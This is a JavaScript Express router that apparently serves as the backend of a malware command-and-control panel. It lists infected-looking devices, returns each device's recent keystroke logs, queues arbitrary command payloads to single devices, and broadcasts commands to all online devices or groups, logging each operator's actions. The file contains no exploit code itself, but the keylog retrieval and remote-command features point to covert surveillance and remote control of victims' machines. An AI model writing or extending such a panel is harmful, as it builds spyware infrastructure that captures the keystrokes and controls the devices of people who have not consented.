import { Router } from 'express';
import { v4 as uuidv4 } from 'uuid';
import { authMiddleware } from './auth.js';
import { log } from '../utils.js';

export function createDevicesRouter(db, config) {
  const router = Router();
  const requireAuth = authMiddleware(db, config);

  // All device routes require auth
  router.use(requireAuth);

  // GET /api/devices — list all devices
  router.get('/', (req, res) => {
    const { group, online, search } = req.query;
    let devices;

    if (group) {
      devices = db.db.prepare('SELECT * FROM devices WHERE group_id = ? ORDER BY last_seen_at DESC').all(group);
    } else if (online === 'true') {
      devices = db.stmts.getOnlineDevices.all();
    } else if (search) {
      devices = db.db.prepare(
        `SELECT * FROM devices WHERE name LIKE ? OR manufacturer LIKE ? OR model LIKE ? OR public_ip LIKE ? ORDER BY last_seen_at DESC`
      ).all(`%${search}%`, `%${search}%`, `%${search}%`, `%${search}%`);
    } else {
      devices = db.stmts.getAllDevices.all();
    }

    res.json({ devices, count: devices.length });
  });

  // GET /api/devices/stats — aggregate stats
  router.get('/stats', (req, res) => {
    const total = db.db.prepare('SELECT COUNT(*) as count FROM devices').get();
    const online = db.db.prepare('SELECT COUNT(*) as count FROM devices WHERE is_online = 1').get();
    const groups = db.db.prepare('SELECT COUNT(*) as count FROM device_groups').get();
    const commandsToday = db.db.prepare(
      "SELECT COUNT(*) as count FROM commands WHERE date(created_at) = date('now')"
    ).get();

    res.json({
      totalDevices: total.count,
      onlineDevices: online.count,
      totalGroups: groups.count,
      commandsToday: commandsToday.count,
    });
  });

  // GET /api/devices/:id — single device
  router.get('/:id', (req, res) => {
    const device = db.stmts.getDeviceById.get(req.params.id);
    if (!device) return res.status(404).json({ error: 'Device not found' });

    // Get recent commands
    const commands = db.stmts.getCommandsByDevice.all(req.params.id);

    // Get recent keylogs
    const keylogs = db.stmts.getKeylogs.all(req.params.id, 50);

    res.json({ device, commands, keylogs });
  });

  // PATCH /api/devices/:id — update device metadata
  router.patch('/:id', (req, res) => {
    const device = db.stmts.getDeviceById.get(req.params.id);
    if (!device) return res.status(404).json({ error: 'Device not found' });

    const { name, group_id, tags, notes } = req.body;

    if (name !== undefined) device.name = name;
    if (group_id !== undefined) device.group_id = group_id;
    if (tags !== undefined) device.tags = JSON.stringify(tags);
    if (notes !== undefined) device.notes = notes;

    db.db.prepare(`
      UPDATE devices SET name = ?, group_id = ?, tags = ?, notes = ? WHERE id = ?
    `).run(device.name, device.group_id, device.tags, device.notes, device.id);

    log('info', 'Device updated', { deviceId: device.id, by: req.user.username });

    res.json({ device });
  });

  // DELETE /api/devices/:id — remove device
  router.delete('/:id', (req, res) => {
    const device = db.stmts.getDeviceById.get(req.params.id);
    if (!device) return res.status(404).json({ error: 'Device not found' });

    db.stmts.deleteDevice.run(req.params.id);

    db.stmts.insertAudit.run({
      id: uuidv4(),
      userId: req.user.id,
      action: 'delete_device',
      targetType: 'device',
      targetId: req.params.id,
      details: JSON.stringify({ name: device.name, model: device.model }),
      ip: req.ip,
    });

    log('info', 'Device deleted', { deviceId: req.params.id, by: req.user.username });

    res.json({ message: 'Device removed' });
  });

  // POST /api/devices/:id/command — send command to device
  router.post('/:id/command', (req, res) => {
    const device = db.stmts.getDeviceById.get(req.params.id);
    if (!device) return res.status(404).json({ error: 'Device not found' });

    const { type, payload } = req.body;
    if (!type || !payload) {
      return res.status(400).json({ error: 'Command type and payload required' });
    }

    const commandId = uuidv4();
    db.stmts.insertCommand.run({
      id: commandId,
      deviceId: device.id,
      type,
      payload: typeof payload === 'string' ? payload : JSON.stringify(payload),
      status: 'pending',
      operatorId: req.user.id,
    });

    db.stmts.insertAudit.run({
      id: uuidv4(),
      userId: req.user.id,
      action: 'command',
      targetType: 'device',
      targetId: device.id,
      details: JSON.stringify({ type, payload: payload.slice(0, 200) }),
      ip: req.ip,
    });

    log('info', 'Command sent', { deviceId: device.id, type, by: req.user.username });

    res.status(201).json({ commandId, status: 'pending' });
  });

  // POST /api/devices/broadcast — send command to all devices in a group or all
  router.post('/broadcast', (req, res) => {
    const { type, payload, groupId } = req.body;
    if (!type || !payload) {
      return res.status(400).json({ error: 'Command type and payload required' });
    }

    let devices;
    if (groupId) {
      devices = db.db.prepare('SELECT * FROM devices WHERE group_id = ? AND is_online = 1').all(groupId);
    } else {
      devices = db.stmts.getOnlineDevices.all();
    }

    if (devices.length === 0) {
      return res.status(404).json({ error: 'No online devices found' });
    }

    const commandIds = [];
    const insertMany = db.db.transaction((devs) => {
      for (const device of devs) {
        const id = uuidv4();
        db.stmts.insertCommand.run({
          id,
          deviceId: device.id,
          type,
          payload: typeof payload === 'string' ? payload : JSON.stringify(payload),
          status: 'pending',
          operatorId: req.user.id,
        });
        commandIds.push({ deviceId: device.id, commandId: id });
      }
    });

    insertMany(devices);

    log('info', 'Broadcast sent', {
      type,
      deviceCount: devices.length,
      groupId: groupId || 'all',
      by: req.user.username,
    });

    res.status(201).json({ commandIds, deviceCount: devices.length });
  });

  // --- Groups ---

  // GET /api/devices/groups/list
  router.get('/groups/list', (req, res) => {
    const groups = db.stmts.getGroups.all();
    const groupsWithCount = groups.map(g => {
      const count = db.db.prepare('SELECT COUNT(*) as count FROM devices WHERE group_id = ?').get(g.id);
      return { ...g, deviceCount: count.count };
    });
    res.json({ groups: groupsWithCount });
  });

  // POST /api/devices/groups
  router.post('/groups', (req, res) => {
    const { name, description } = req.body;
    if (!name) return res.status(400).json({ error: 'Group name required' });

    const id = uuidv4();
    db.stmts.createGroup.run({ id, name, description: description || '' });

    log('info', 'Group created', { name, by: req.user.username });

    res.status(201).json({ id, name, description });
  });

  // DELETE /api/devices/groups/:id
  router.delete('/groups/:id', (req, res) => {
    const group = db.stmts.getGroup.get(req.params.id);
    if (!group) return res.status(404).json({ error: 'Group not found' });

    db.stmts.deleteGroup.run(req.params.id);
    // Reassign devices to no group
    db.db.prepare('UPDATE devices SET group_id = NULL WHERE group_id = ?').run(req.params.id);

    log('info', 'Group deleted', { id: req.params.id, by: req.user.username });

    res.json({ message: 'Group deleted' });
  });

  return router;
}
